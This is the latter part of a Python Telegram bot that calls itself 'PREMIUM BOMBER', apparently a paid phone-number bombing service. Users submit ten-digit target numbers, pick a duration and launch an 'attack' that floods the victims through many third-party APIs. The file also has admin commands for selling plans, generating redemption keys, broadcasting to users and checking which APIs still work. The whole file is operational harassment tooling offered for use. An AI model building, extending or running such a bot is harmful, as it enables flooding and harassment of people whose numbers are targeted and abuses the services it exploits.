async def inbox_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    pending = await manager.db.get_pending_contacts()
    if not pending:
        await update.message.reply_text("📭 No pending messages.")
        return
    for m in pending[:5]:
        text = f"📩 MSG #{m['id']}\n👤 {m['user_id']}\n💬 {m['message']}\n\nReply: /reply {m['user_id']} <msg>"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{m['id']}")],
            [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{m['user_id']}")]
        ])
        await update.message.reply_text(text, reply_markup=kb)

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /unblock <user_id>")
        return
    await manager.db.unblock_contact(int(args[0]))
    await update.message.reply_text(f"✅ Unblocked {args[0]}")

# ========== NEW: ADMIN GIVE PLAN COMMANDS ==========
async def giveplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /giveplan <user_id> <plan> <days>"""
    uid = update.effective_user.id
    if uid != OWNER_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    args = context.args
    if not args or len(args) < 3:
        await update.message.reply_text(
            "📖 **Usage:** `/giveplan <user_id> <plan> <days>`\n\n"
            "**Examples:**\n"
            "• `/giveplan 123456789 standard 30`\n"
            "• `/giveplan 123456789 premium 30`\n"
            "• `/giveplan 123456789 ultimate 90`\n\n"
            "**Plans:** standard, premium, ultimate",
            parse_mode="Markdown"
        )
        return
    try:
        tid = int(args[0])
        plan_type = args[1].lower()
        days = int(args[2])
        if plan_type not in PLANS:
            await update.message.reply_text("❌ Invalid plan! Use: standard, premium, ultimate")
            return
        if days <= 0 or days > 3650:
            await update.message.reply_text("❌ Days must be 1-3650.")
            return

        await manager.db.add_user(tid)
        exp = await manager.db.add_premium(tid, days, plan_type)
        p = PLANS[plan_type]

        await update.message.reply_text(
            f"✅ **PLAN ACTIVATED!**\n\n"
            f"👤 User: `{tid}`\n"
            f"📋 Plan: **{p['name']}**\n"
            f"📅 Days: {days}\n"
            f"📆 Expiry: `{exp[:10]}`\n"
            f"⚡ Concurrent: {p['concurrent']}\n"
            f"⏰ Max Duration: {p['max_duration']}min",
            parse_mode="Markdown"
        )

        try:
            await context.bot.send_message(
                tid,
                f"🎉 **PREMIUM ACTIVATED!**\n\n"
                f"👑 Admin has activated your plan!\n\n"
                f"📋 Plan: **{p['name']}**\n"
                f"📅 Days: {days}\n"
                f"📆 Expiry: `{exp[:10]}`\n"
                f"⚡ Concurrent: {p['concurrent']}\n"
                f"⏰ Max: {p['max_duration']}min\n\n"
                f"🚀 Use /mix to start!",
                parse_mode="Markdown"
            )
        except Exception:
            pass
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /users - List all users"""
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    users = await manager.db.get_all_users_with_plan()
    if not users:
        await update.message.reply_text("📭 No users yet.")
        return
    page = 1
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    per_page = 20
    total = len(users)
    total_p = (total + per_page - 1) // per_page
    start = (page - 1) * per_page
    p_users = users[start:start + per_page]

    msg = f"📋 **USERS** (Page {page}/{total_p})\n👥 Total: **{total}**\n━━━━━━━━━━━━━━━\n\n"
    now = datetime.now()
    for u in p_users:
        plan = "Free"
        exp_s = "N/A"
        if u.get('premium_expiry'):
            try:
                e = datetime.fromisoformat(u['premium_expiry'])
                if e > now:
                    plan = (u.get('premium_plan') or 'standard').upper()
                    exp_s = f"{(e - now).days}d"
                else:
                    plan = "Expired"
            except Exception:
                pass
        msg += f"🆔 `{u['user_id']}` - {plan} ({exp_s})\n"

    if total_p > 1:
        msg += f"\n📄 Next: `/users {page + 1}`" if page < total_p else ""
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan", callback_data="adm_give_plan")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="adm_users_refresh")]
    ])
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)

async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /userinfo <user_id>"""
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /userinfo <user_id>")
        return
    tid = int(args[0])
    user = await manager.db.get_user(tid)
    if not user:
        await update.message.reply_text(f"❌ User {tid} not found.")
        return
    plan = await manager.db.get_plan_name(tid)
    exp = await manager.db.get_expiry(tid)
    con = await manager.db.get_concurrent_limit(tid)
    md = await manager.db.get_max_duration(tid)
    prot = user.get('protected_number') or "None"
    msg = (f"👤 **USER INFO**\n━━━━━━━━━━━━━━━\n\n"
           f"🆔 `{tid}`\n📋 Plan: **{plan}**\n📅 Expiry: `{exp}`\n"
           f"⚡ Concurrent: {con}\n⏰ Max: {md}min\n🛡 Protected: `{prot}`\n"
           f"📆 Joined: `{(user.get('created_at') or 'N/A')[:10]}`")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan", callback_data=f"give_plan_user_{tid}")],
        [InlineKeyboardButton("❌ Remove Plan", callback_data=f"remove_plan_user_{tid}")],
        [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{tid}")]
    ])
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)

async def removeplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /removeplan <user_id>"""
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /removeplan <user_id>")
        return
    tid = int(args[0])
    if not await manager.db.get_user(tid):
        await update.message.reply_text(f"❌ User {tid} not found.")
        return
    await manager.db.remove_premium(tid)
    await update.message.reply_text(f"✅ Plan removed for `{tid}`", parse_mode="Markdown")
    try:
        await context.bot.send_message(tid, "⚠️ Your premium plan has been removed by admin.")
    except Exception:
        pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    uid = update.effective_user.id
    msg = f"""ℹ️ **HELP**

🚀 **USER COMMANDS**
• /start - Main menu
• /mix - Start attack
• /status - Attack status
• /account - Your account
• /plan - View plans
• /redeem - Activate code
• /protect & /unprotect
• /contact - Message admin

💡 **Total APIs: {len(APIS)}**"""

    if uid == OWNER_ID:
        msg += """

👑 **ADMIN COMMANDS**
• /giveplan <uid> <plan> <days>
• /users - List all users
• /userinfo <uid> - User details
• /removeplan <uid> - Remove plan
• /inbox - Contact messages
• /reply <uid> <msg>
• /unblock <uid>

🎁 **Examples:**
`/giveplan 123456789 standard 30`
`/giveplan 123456789 premium 30`
`/giveplan 123456789 ultimate 90`"""

    await update.message.reply_text(msg, reply_markup=main_kb(uid), parse_mode="Markdown")

async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan to User", callback_data="adm_give_plan")],
        [InlineKeyboardButton("📋 View All Users", callback_data="adm_users_list")],
        [InlineKeyboardButton("🔑 Gen Standard Key", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("⭐ Gen Premium Key", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("👑 Gen Ultimate Key", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("🔧 Custom Key", callback_data="adm_custom_key")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("📣 Set Channel", callback_data="adm_set_channel")],
        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
        [InlineKeyboardButton("🔍 Check APIs", callback_data="adm_check_apis")],
        [InlineKeyboardButton("📥 Contact Inbox", callback_data="adm_inbox")],
        [InlineKeyboardButton("🚫 Blocked Users", callback_data="adm_blocked_users")]
    ])
    await update.message.reply_text("👑 **Admin Panel:**", parse_mode="Markdown", reply_markup=kb)

async def generate_key_logic(update, context, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS:
            plan = "standard"
        code = await manager.db.generate_code(days, plan)
        await update.message.reply_text(f"✅ **KEY GENERATED**\n\n🔑 `{code}`\n📅 {days}d\n📋 {plan.upper()}", parse_mode="Markdown")
    except Exception:
        await update.message.reply_text("❌ Format: `days plan`\nExample: `30 premium`", parse_mode="Markdown")

async def broadcast_logic(update, context, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_broadcast'] = False
    users = await manager.db.get_all_users()
    ok, fail = 0, 0
    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)}...")
    for u in users:
        try:
            await context.bot.send_message(u, f"📢 **ANNOUNCEMENT**\n\n{text}", parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
            await asyncio.sleep(0.05)
    await msg.edit_text(f"✅ Broadcast Done\n✅ {ok}\n❌ {fail}")

async def process_numbers(update, context, text):
    uid = update.effective_user.id
    nums = [n.strip() for n in text.replace(',', ' ').split() if n.strip().isdigit() and len(n.strip()) == 10]
    cnt = context.user_data.get('expected_targets', 0)
    if len(nums) != cnt:
        await update.message.reply_text(f"❌ Send exactly {cnt} numbers.")
        return
    context.user_data['waiting_for_numbers'] = False
    manager.db.set_attack_data(uid, nums)
    md = await manager.db.get_max_duration(uid)
    await update.message.reply_text(f"📞 Targets: {', '.join(nums)}\n⏰ Duration (Max: {md}min):", reply_markup=await duration_kb(uid))

async def handle_msg(update, context):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    text = update.message.text

    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text)
        return
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text)
        return
    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
        context.user_data['waiting_for_channel'] = False
        c = text.strip().strip('@')
        if 't.me/' in c:
            c = c.split('t.me/')[-1]
        c = c.split('?')[0].split('/')[0].strip()
        if not c:
            await update.message.reply_text("❌ Invalid channel!")
            return
        await manager.db.set_channel(c)
        await update.message.reply_text(f"✅ Channel set: @{c}")
        return

    if context.user_data.get('waiting_for_contact_msg'):
        context.user_data['waiting_for_contact_msg'] = False
        if await manager.db.is_contact_blocked(uid):
            await update.message.reply_text("🚫 Blocked.")
            return
        mid = await manager.db.add_contact_message(uid, text)
        await update.message.reply_text(f"✅ Message sent! ID: #{mid}")
        try:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{mid}")],
                [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{uid}")]
            ])
            await context.bot.send_message(OWNER_ID, f"📩 **NEW MSG**\n👤 `{uid}`\n💬 {text}\n\nReply: `/reply {uid} <msg>`", reply_markup=kb, parse_mode="Markdown")
        except Exception:
            pass
        return

    await manager.db.add_user(uid)

    if text in ("🚀 /mix", "/mix"):
        await mix_command(update, context)
    elif text in ("📊 /status", "/status"):
        await status_command(update, context)
    elif text in ("👤 /account", "/account"):
        await account_command(update, context)
    elif text in ("💳 /plan", "/plan"):
        await plan_command(update, context)
    elif text in ("🔑 /redeem", "/redeem"):
        await redeem_command(update, context)
    elif text in ("🛡 /protect", "/protect"):
        await protect_command(update, context)
    elif text in ("🔓 /unprotect", "/unprotect"):
        await unprotect_command(update, context)
    elif text in ("📩 /contact", "/contact"):
        await contact_command(update, context)
    elif text in ("❓ /help", "/help"):
        await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID:
        await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_target_count'):
        pass
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        ok, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
        if ok:
            await update.message.reply_text(f"✅ Activated!\n📋 {plan.upper()}\n📅 {exp[:10]}")
        else:
            await update.message.reply_text("❌ Invalid or used code.")
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        await manager.db.protect(uid, text)
        await update.message.reply_text(f"🛡 Protected: {text}")
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets', 'waiting_for_contact_msg', 'waiting_for_channel']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

async def btn_handler(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await check_channel_join(update, context):
        return
    data = q.data

    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "standard")
        await q.message.reply_text(f"✅ **STANDARD KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "premium")
        await q.message.reply_text(f"✅ **PREMIUM KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "ultimate")
        await q.message.reply_text(f"✅ **ULTIMATE KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await q.message.reply_text("🔑 Send: `days plan_type`\nExample: `30 standard`", parse_mode="Markdown")
    elif data == "adm_give_plan" and uid == OWNER_ID:
        await q.message.reply_text(
            "🎁 **GIVE PLAN**\n\n"
            "**Format:** `/giveplan <user_id> <plan> <days>`\n\n"
            "**Examples:**\n"
            "• `/giveplan 123456789 standard 30`\n"
            "• `/giveplan 123456789 premium 30`\n"
            "• `/giveplan 123456789 ultimate 90`",
            parse_mode="Markdown"
        )
    elif data == "adm_users_list" and uid == OWNER_ID:
        users = await manager.db.get_all_users_with_plan()
        if not users:
            await q.message.reply_text("📭 No users.")
            return
        total = len(users)
        p_users = users[:20]
        msg = f"📋 **USERS** (1/{((total-1)//20)+1})\n👥 Total: **{total}**\n━━━━━━━━━━━━━━━\n\n"
        now = datetime.now()
        for u in p_users:
            plan = "Free"
            exp_s = "N/A"
            if u.get('premium_expiry'):
                try:
                    e = datetime.fromisoformat(u['premium_expiry'])
                    if e > now:
                        plan = (u.get('premium_plan') or 'standard').upper()
                        exp_s = f"{(e - now).days}d"
                    else:
                        plan = "Expired"
                except Exception:
                    pass
            msg += f"🆔 `{u['user_id']}` - {plan} ({exp_s})\n"
        if total > 20:
            msg += f"\n... +{total - 20} more\nUse `/users 2`"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎁 Give Plan", callback_data="adm_give_plan")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="adm_users_refresh")]
        ])
        await q.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)
    elif data == "adm_users_refresh" and uid == OWNER_ID:
        users = await manager.db.get_all_users_with_plan()
        await q.answer(f"Total: {len(users)}", show_alert=True)
    elif data.startswith("give_plan_user_"):
        if uid != OWNER_ID:
            return
        tid = data.replace("give_plan_user_", "")
        await q.message.reply_text(
            f"🎁 **Give plan to `{tid}`**\n\n"
            f"`/giveplan {tid} standard 30`\n"
            f"`/giveplan {tid} premium 30`\n"
            f"`/giveplan {tid} ultimate 30`",
            parse_mode="Markdown"
        )
    elif data.startswith("remove_plan_user_"):
        if uid != OWNER_ID:
            return
        tid = int(data.replace("remove_plan_user_", ""))
        await manager.db.remove_premium(tid)
        await q.message.reply_text(f"✅ Removed plan for `{tid}`", parse_mode="Markdown")
        try:
            await context.bot.send_message(tid, "⚠️ Your plan was removed by admin.")
        except Exception:
            pass
    elif data.startswith("targets_"):
        cnt = int(data.split("_")[1])
        context.user_data['waiting_for_target_count'] = False
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = cnt
        await q.edit_message_text(f"📞 Send {cnt} phone number(s):\nExample: {' '.join(['9876543210'] * cnt)}")
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await q.edit_message_text("❌ Session expired. /mix again.")
            return
        dur = int(data.split("_")[1])
        ok, msg = await manager.start_attack(uid, targets, dur)
        if ok:
            await q.edit_message_text(f"🚀 **ATTACK STARTED!**\n🎯 {', '.join(targets)}\n📊 {len(targets)}\n{msg}", parse_mode="Markdown")
        else:
            await q.edit_message_text(f"❌ {msg}")
        manager.db.clear_attack_data(uid)
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await q.edit_message_text("❌ Cancelled.")
    elif data == "stop":
        if await manager.stop_attack(uid):
            await q.edit_message_text("🛑 Stopped.")
        else:
            await q.answer("No active attack.")
    elif data == "contact_admin":
        await q.message.reply_text("📩 Send your message. /cancel to cancel.")
        context.user_data['waiting_for_contact_msg'] = True
    elif data.startswith("mark_replied_"):
        if uid != OWNER_ID:
            return
        mid = int(data.split("_")[2])
        await manager.db.reply_contact_message(mid, "Replied")
        await q.message.reply_text(f"✅ #{mid} marked.")
    elif data.startswith("block_user_"):
        if uid != OWNER_ID:
            return
        tid = int(data.split("_")[2])
        await manager.db.block_contact(tid)
        await q.message.reply_text(f"🚫 User {tid} blocked.")
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await q.message.reply_text("📢 Send broadcast message:")
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c, pend = await manager.db.get_stats()
        await q.message.reply_text(f"📊 **STATS**\n\n👥 Users: {u}\n⭐ Premium: {p}\n🔑 Codes: {c}\n📩 Pending: {pend}\n💎 Owner: `{OWNER_ID}`", parse_mode="Markdown")
    elif data == "adm_set_channel" and uid == OWNER_ID:
        context.user_data['waiting_for_channel'] = True
        await q.message.reply_text("📣 Send channel: @yourchannel or t.me/yourchannel")
    elif data == "adm_remove_channel" and uid == OWNER_ID:
        await manager.db.remove_channel()
        await q.message.reply_text("🗑 Channel removed.")
    elif data == "adm_inbox" and uid == OWNER_ID:
        pending = await manager.db.get_pending_contacts()
        if not pending:
            await q.message.reply_text("📭 No pending.")
        else:
            for m in pending[:5]:
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{m['id']}")],
                    [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{m['user_id']}")]
                ])
                await q.message.reply_text(f"📩 #{m['id']}\n👤 {m['user_id']}\n💬 {m['message']}", reply_markup=kb)
    elif data == "adm_blocked_users" and uid == OWNER_ID:
        blocked = await manager.db.get_blocked_users()
        if not blocked:
            await q.message.reply_text("📭 No blocked users.")
        else:
            await q.message.reply_text("🚫 **Blocked:**\n" + "\n".join(f"• `{b}`" for b in blocked) + "\n\nUse `/unblock <uid>`", parse_mode="Markdown")
    elif data == "adm_check_apis" and uid == OWNER_ID:
        sm = await q.message.reply_text("🔍 Checking APIs... Please wait...")
        try:
            working, failed = await manager.check_working_apis()
            r = f"📊 **API STATUS**\n\n✅ Total: {len(APIS)}\n✅ Working: {len(working)}\n❌ Failed: {len(failed)}\n\n"
            if working:
                r += "**✅ WORKING (Top 30):**\n" + "\n".join(f"{i}. {n}" for i, n in enumerate(working[:30], 1))
            await sm.edit_text(r)
        except Exception as e:
            await sm.edit_text(f"❌ Error: {e}")
    elif data == "info":
        con = await manager.db.get_concurrent_limit(uid)
        await q.answer(f"⚡ {con}x Concurrent\n📡 Total APIs: {len(APIS)}", show_alert=True)

async def cancel_command(update, context):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets', 'waiting_for_contact_msg', 'waiting_for_channel']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

async def shutdown_handler(sig, loop):
    if manager:
        await manager._close_session()
    tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
    [t.cancel() for t in tasks]
    await asyncio.gather(*tasks, return_exceptions=True)
    loop.stop()

# ========== MAIN ==========
def main():
    global db, database, manager
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    db = SqliteStorage(DB_PATH)

    async def init():
        await db.ensure_indexes()
    loop.run_until_complete(init())

    database = DatabaseWrapper()
    manager = AttackManager()

    for s in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(s, lambda: asyncio.create_task(shutdown_handler(s, loop)))

    from telegram.ext import ApplicationBuilder
    app = (ApplicationBuilder()
           .token(BOT_TOKEN)
           .read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30)
           .build())

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("contact", contact_command))
    app.add_handler(CommandHandler("reply", reply_command))
    app.add_handler(CommandHandler("inbox", inbox_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    # NEW ADMIN COMMANDS
    app.add_handler(CommandHandler("giveplan", giveplan_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("userinfo", userinfo_command))
    app.add_handler(CommandHandler("removeplan", removeplan_command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))

    logger.info("=" * 60)
    logger.info(f"🔥 PREMIUM BOMBER Started")
    logger.info(f"📡 Total APIs: {len(APIS)}")
    logger.info("=" * 60)

    loop.create_task(web_server())

    if USE_WEBHOOK and WEBHOOK_URL:
        app.run_webhook(listen="0.0.0.0", port=PORT, url_path=BOT_TOKEN,
                        webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}", drop_pending_updates=True)
    else:
        app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
